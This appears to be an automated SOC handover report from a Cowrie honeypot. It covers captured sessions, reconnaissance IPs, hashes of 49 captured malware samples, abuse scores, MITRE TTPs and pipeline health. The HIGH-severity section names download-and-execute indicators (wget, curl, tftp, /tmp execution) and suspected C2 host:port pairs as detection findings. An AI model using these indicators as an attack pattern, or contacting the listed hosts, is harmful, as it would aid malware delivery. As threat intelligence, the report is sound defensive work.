| **First Seen** | 2026-07-02 22:52 |
| **Last Seen** | 2026-07-02 22:52 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 22:52:46` | `cowrie.session.connect` |
| `2026-07-02 22:52:47` | `cowrie.client.version` |
| `2026-07-02 22:52:47` | `cowrie.client.kex` |
| `2026-07-02 22:52:54` | `cowrie.login.success` |
| `2026-07-02 22:52:56` | `cowrie.session.params` |
| `2026-07-02 22:52:56` | `cowrie.command.input` |
| `2026-07-02 22:52:58` | `cowrie.log.closed` |
| `2026-07-02 22:52:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `210.16.100[.]120` | **20** | 2026-07-02 20:56 | 2026-07-02 22:49 | 17m | 0 | `T1592` | 🟠 MEDIUM |
| `20.169.105[.]72` | **2** | 2026-07-02 22:07 | 2026-07-02 22:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `67.220.180[.]114` | **2** | 2026-07-02 21:29 | 2026-07-02 22:39 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.55.180[.]195` | 1 | 2026-07-02 22:36 | 2026-07-02 22:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `107.150.146[.]69` | 1 | 2026-07-02 21:10 | 2026-07-02 21:11 | 40s | 0 | `T1592` | 🟢 LOW |
| `118.145.213[.]116` | 1 | 2026-07-02 22:41 | 2026-07-02 22:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `13.94.39[.]162` | 1 | 2026-07-02 22:41 | 2026-07-02 22:41 | 17s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]114` | 1 | 2026-07-02 22:33 | 2026-07-02 22:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.64[.]39` | 1 | 2026-07-02 21:19 | 2026-07-02 21:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `141.11.88[.]122` | 1 | 2026-07-02 22:08 | 2026-07-02 22:08 | 30s | 0 | `T1592` | 🟢 LOW |
| `175.149.212[.]75` | 1 | 2026-07-02 20:57 | 2026-07-02 20:57 | 14s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]152` | 1 | 2026-07-02 22:03 | 2026-07-02 22:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]214` | 1 | 2026-07-02 22:40 | 2026-07-02 22:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.8[.]221` | 1 | 2026-07-02 22:28 | 2026-07-02 22:28 | 4s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]73` | 1 | 2026-07-02 22:47 | 2026-07-02 22:47 | 15s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **17/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 41/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 84/100 | 🔴 HIGH | **35/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **43/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2` | ELF Binary (Linux executable) (MIPS 32-bit) | `938d5d3054da1707...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db` | Shell Script | `93e71b122a432c2b...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 42/100 | 🟡 MEDIUM | **30/73** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/74** 🔴 |
| `b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` | Python Script | `b1633346a694467b...` | 62/100 | 🟡 MEDIUM | **7/75** 🔴 |
| `b1e4374da060cb4bf9ff872f3e060486d9cd400519e0b2823f61670d64148ab4` | ELF Binary (Linux executable) (x86-64 64-bit) | `b1e4374da060cb4b...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49` | ELF Binary (Linux executable) (x86-64 64-bit) | `b20f39fc00d242e7...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `bc917f6bbce0845d39c27ee8147a140bf5ab594f50558024f0ec925864ec69c7` | ELF Binary (Linux executable) (MIPS 32-bit) | `bc917f6bbce0845d...` | 30/100 | 🟢 LOW | Not in VT |
| `bcc130d7635ef1ef7350d3135bf3e4abb606dce75f1972636144f96b12839425` | Bash Script | `bcc130d7635ef1ef...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `64.110.90[.]250` | KR | Oracle Corporation | **100** ⚠️ | 4 |
| `132.226.64[.]178` | US | Oracle Public Cloud | **100** ⚠️ | 0 |
| `175.149.212[.]75` | CN | CHINA UNICOM Liaoning province network | **100** ⚠️ | 0 |
| `218.144.90[.]41` | KR | Korea Telecom | **100** ⚠️ | 10 |
| `115.190.62[.]211` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 0 |
| `45.79.8[.]221` | US | Linode | **100** ⚠️ | 50 |
| `58.20.201[.]4` | CN | CNC Group HuNan ZhuZhou network | **100** ⚠️ | 50 |
| `66.132.195[.]73` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `45.198.224[.]120` | NL | VPSVAULT.HOST LTD | **100** ⚠️ | 4 |
| `45.205.1[.]42` | BR | VPSVAULT.HOST LTD | **100** ⚠️ | 8 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 75 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 61 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 11 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 10 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 2 |

---

## 🔕 False Positive Summary (12 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 24 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 7 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 109 cases |
| Tool 34  | Credential Extractor        | ✅ 95 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 9 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 39 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 12 filtered (11.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 27 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 37 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 61 priority case(s) shown individually · 15 recon entry/entries in table (3 group(s) consolidating 24 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-02T23:12:36Z_
